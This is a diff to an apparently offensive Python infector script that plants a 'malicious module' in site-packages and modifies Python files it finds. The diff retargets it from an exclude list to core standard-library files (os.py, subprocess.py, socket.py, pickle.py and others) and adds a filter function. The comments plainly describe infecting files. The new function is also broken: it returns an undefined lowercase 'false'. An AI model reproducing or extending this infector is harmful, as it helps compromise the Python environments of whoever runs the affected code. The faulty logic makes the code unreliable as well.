@@ -11,7 +11,7 @@ import sys
 
 MODULE_CODE = "changeme"           # The malicious module source code file
 DEST_MODULE_NAME = "changeme"       # The name of the module that will get dropped into sitepkg
-EXCLUDE_LIST = ["Enderman.py", "/path/to/yum.py", "/path/to/dnf.py" ]  # A list of files we won't infect
+INCLUDE_LIST = ["datetime.py", "io.py", "operator.py", "os.py", "pickle.py", "random.py", "re.py", "socket.py", "stat.py", "string.py", "subprocess.py" ]  # A list of files we will infect
 
 
 def get_pkg_dir():
@@ -59,14 +59,12 @@ def find_py(pth):
     @param pth: the starting directory to search
     @return: an array of URIs of python files to infect
     """
-    global EXCLUDE_LIST
     py_files = []
     for subdir, dirs, files in os.walk(pth):        # iterate through everything
         for fil in files:
             fname = os.path.join(subdir, fil)
             if ".py" in fname:                      # if it's python
-                if fname not in EXCLUDE_LIST:       # if it's not on our ignore list
-                    py_files.append(fname)
+                py_files.append(fname)
 
     return py_files
 
@@ -98,6 +96,17 @@ def infect_file(file_path):
         return
 
 
+def should_infect(pth):
+    """
+    Check the file against the 'include' list to determine if we should infect
+    @param pth: the complete URI of the file we'll check
+    return: a boolean indicating if we should infect the file
+    """
+    fname = str(re.search('/(.+?).py', pth).group(0)) + ".py"
+    print(fname)
+    return false
+
+
 def infect(search_dir):
     """
     The work horse function of the script; drops module and infects files
@@ -108,8 +117,9 @@ def infect(search_dir):
     drop_module(mod_dest)   # write the module
     py_files = find_py(search_dir)  # find python
     for f in py_files:
-        print("Infecting " + f + "...")
-        infect_file(f)      # hack em
+        if should_infect(f):
+            #print("Infecting " + f + "...")
+            infect_file(f)      # hack em
     return
 
 
